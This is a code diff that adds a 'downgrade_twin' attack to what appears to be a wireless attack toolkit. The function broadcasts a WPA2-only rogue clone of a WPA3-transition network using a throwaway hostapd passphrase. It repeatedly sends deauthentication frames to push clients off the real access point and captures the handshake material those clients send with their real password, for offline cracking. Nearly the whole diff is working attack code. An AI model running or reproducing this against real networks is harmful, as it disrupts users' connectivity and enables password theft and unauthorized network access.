@@ -17,7 +17,9 @@ the tool indefinitely.
 from __future__ import annotations
 
 import os
+import secrets
 import signal
+import string
 import subprocess
 import tempfile
 import textwrap
@@ -29,6 +31,7 @@ from urllib.parse import parse_qs
 
 from ..frames import BROADCAST
 from .deauth import deauth as _deauth
+from .handshake import HandshakeStatus, capture_handshake as _capture_handshake
 
 # ── constants ────────────────────────────────────────────────────────────────
 
@@ -54,6 +57,15 @@ class EvilTwinResult:
     detail: str = ""
 
 
+@dataclass
+class DowngradeTwinResult:
+    """Outcome of a run_downgrade_twin() call."""
+    status: HandshakeStatus = HandshakeStatus.NONE
+    outfile: str | None = None
+    elapsed: float = 0.0
+    detail: str = ""
+
+
 # ── config builders ──────────────────────────────────────────────────────────
 
 def _hostapd_conf(iface: str, ssid: str, channel: int) -> str:
@@ -67,6 +79,39 @@ def _hostapd_conf(iface: str, ssid: str, channel: int) -> str:
         auth_algs=1
         wpa=0
     """)
+
+
+def _hostapd_conf_wpa2(iface: str, ssid: str, channel: int, passphrase: str) -> str:
+    """WPA2-PSK variant for downgrade_twin -- the passphrase is a throwaway
+    placeholder, never the target network's real one. hostapd requires
+    SOME valid 8-63 char passphrase to run in WPA-PSK mode at all, but we
+    never need it to actually validate: a client auto-reconnecting with
+    its own real (different) password still completes Message 1/2 of the
+    4-way handshake using a PMK derived from ITS real password before
+    hostapd's own MIC check on Message 2 fails and rejects it -- that
+    M1+M2 pair, captured independently by capture_handshake() on iface_mon,
+    is exactly the crackable CHALLENGE-status material this attack exists
+    to harvest (see attacks/handshake.py's HandshakeStatus docstring)."""
+    return textwrap.dedent(f"""\
+        interface={iface}
+        driver=nl80211
+        ssid={ssid}
+        hw_mode=g
+        channel={channel if channel <= 13 else 6}
+        ignore_broadcast_ssid=0
+        auth_algs=1
+        wpa=2
+        wpa_passphrase={passphrase}
+        wpa_key_mgmt=WPA-PSK
+        rsn_pairwise=CCMP
+    """)
+
+
+def _random_passphrase(length: int = 32) -> str:
+    """A throwaway hostapd WPA-PSK passphrase -- never the real network's
+    password, just satisfies hostapd's own 8-63 char requirement."""
+    alphabet = string.ascii_letters + string.digits
+    return "".join(secrets.choice(alphabet) for _ in range(length))
 
 
 def _dnsmasq_conf(iface: str) -> str:
@@ -376,6 +421,163 @@ def run_eviltwin(
         return EvilTwinResult(
             elapsed=elapsed,
             detail="timeout — no password submitted" if not stop.is_set() else "aborted",
+        )
+
+    finally:
+        stop.set()
+        cleanup()
+
+
+# ── downgrade_twin: WPA3-transition rogue WPA2-only twin ──────────────────────
+
+def run_downgrade_twin(
+    iface_ap: str,
+    iface_mon: str,
+    bssid: str,
+    ssid: str,
+    channel: int,
+    outfile: str,
+    client: str = BROADCAST,
+    timeout: float = 120.0,
+    stop_event: threading.Event | None = None,
+    progress_fn=None,
+) -> DowngradeTwinResult:
+    """Broadcast a WPA2-only rogue twin of a WPA3-transition-mode target,
+    deauth clients off the real AP, and passively capture whatever 4-way
+    handshake a client attempts against the twin using its own real
+    password (see secure.py's downgrade_twin recommendation and
+    _hostapd_conf_wpa2()'s docstring for why this needs no real
+    passphrase to be useful).
+
+    Much smaller than run_eviltwin() -- no DHCP/NAT/captive portal, since
+    the 4-way handshake completes entirely before any IP is assigned.
+    Args mirror run_eviltwin() where they mean the same thing:
+        iface_ap:  interface to bring up as the rogue AP.
+        iface_mon: interface for both the deauth loop and the passive
+            handshake listener -- monitor mode hears our own AP traffic
+            fine, no second physical radio required.
+        bssid:     the REAL AP's BSSID, used only for deauth targeting.
+        outfile:   where to write the captured handshake pcap.
+    """
+    log = progress_fn or (lambda msg: None)
+    stop = stop_event or threading.Event()
+    t_start = time.monotonic()
+    procs: list[subprocess.Popen] = []
+    tmpfiles: list[str] = []
+
+    def cleanup():
+        for p in procs:
+            try:
+                os.killpg(os.getpgid(p.pid), signal.SIGTERM)
+            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
+                pass
+        for f in tmpfiles:
+            try:
+                os.unlink(f)
+            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
+                pass
+        _flush_ip(iface_ap)
+
+    try:
+        log(f"assigning IP to {iface_ap}")
+        if not _assign_ip(iface_ap):
+            log("failed to assign IP")
+            return DowngradeTwinResult(detail="failed to assign IP to AP interface")
+
+        ap_chan = channel if 1 <= channel <= 13 else 6
+        passphrase = _random_passphrase()
+
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
+                                          prefix="atwa_hostapd_dt_", delete=False) as hconf:
+            hconf.write(_hostapd_conf_wpa2(iface_ap, ssid, ap_chan, passphrase))
+        tmpfiles.append(hconf.name)
+
+        log(f"starting WPA2-only rogue twin on {iface_ap} (ssid={ssid!r}, channel={ap_chan})")
+        hostapd_proc = _popen(["hostapd", hconf.name])
+        procs.append(hostapd_proc)
+        time.sleep(_HOSTAPD_START_WAIT)
+        if hostapd_proc.poll() is not None:
+            log("hostapd exited immediately")
+            return DowngradeTwinResult(detail="hostapd exited immediately — check interface/driver")
+        log("rogue twin up")
+
+        from ..radio import get_mac
+        try:
+            rogue_bssid = get_mac(iface_ap)
+        except Exception:  # noqa: BLE001 - reported to the caller below either way
+            log("could not determine rogue twin's own BSSID — aborting")
+            return DowngradeTwinResult(detail="could not determine rogue AP interface's MAC address")
+        log(f"rogue twin BSSID: {rogue_bssid}")
+
+        listen_result: dict = {}
+
+        def _listen():
+            listen_result["cap"] = _capture_handshake(
+                iface_mon, rogue_bssid, channel=ap_chan, timeout=timeout,
+                outfile=outfile, stop_event=stop, progress_fn=log,
+            )
+
+        listener = threading.Thread(target=_listen, daemon=True)
+        listener.start()
+        log(f"listening for a handshake against the rogue twin, writing to {outfile}")
+
+        def _deauth_loop():
+            round_n = 0
+            while not stop.is_set():
+                round_n += 1
+                try:
+                    sent = _deauth(iface_mon, bssid, client=client, channel=channel, progress_fn=log)
+                    if sent == 0:
+                        log(f"downgrade_twin deauth round {round_n}: did NOT go out to {bssid} — see the warning above")
+                    else:
+                        log(f"downgrade_twin deauth round {round_n}: sent {sent} deauth frame(s) to {bssid}")
+                except Exception as exc:  # noqa: BLE001 - deauth loop must survive any one-round error
+                    log(f"downgrade_twin deauth round {round_n} failed: {exc}")
+                stop.wait(10.0)
+
+        deauth_thread = threading.Thread(target=_deauth_loop, daemon=True)
+        deauth_thread.start()
+
+        def _best_status() -> HandshakeStatus:
+            cap = listen_result.get("cap")
+            if cap is None or not cap.messages:
+                return HandshakeStatus.NONE
+            best = HandshakeStatus.NONE
+            for a, c in cap.messages:
+                status = cap.status(a, c)
+                if status is HandshakeStatus.AUTHORIZED:
+                    return HandshakeStatus.AUTHORIZED
+                if status is HandshakeStatus.CHALLENGE:
+                    best = HandshakeStatus.CHALLENGE
+            return best
+
+        log(f"waiting up to {timeout:.0f}s for a client to attempt the rogue twin")
+        deadline = time.monotonic() + timeout
+        best = HandshakeStatus.NONE
+        while not stop.is_set() and time.monotonic() < deadline:
+            best = _best_status()
+            if best is not HandshakeStatus.NONE:
+                break
+            time.sleep(0.5)
+
+        stop.set()
+        listener.join(timeout=5)
+        elapsed = time.monotonic() - t_start
+
+        if best is HandshakeStatus.NONE:
+            # listener.join() above guarantees listen_result["cap"] now
+            # reflects its final state, catching the race between the
+            # poll loop's last check and the listener thread actually
+            # finishing.
+            best = _best_status()
+
+        if best is HandshakeStatus.NONE:
+            log("no handshake captured against the rogue twin")
+            return DowngradeTwinResult(elapsed=elapsed, detail="no client attempted the rogue twin")
+        log(f"captured a {best.value} handshake against the rogue twin -> {outfile}")
+        return DowngradeTwinResult(
+            status=best, outfile=outfile, elapsed=elapsed,
+            detail=f"{best.value} handshake captured (real password, unverified by us) -> {outfile}",
         )
 
     finally:
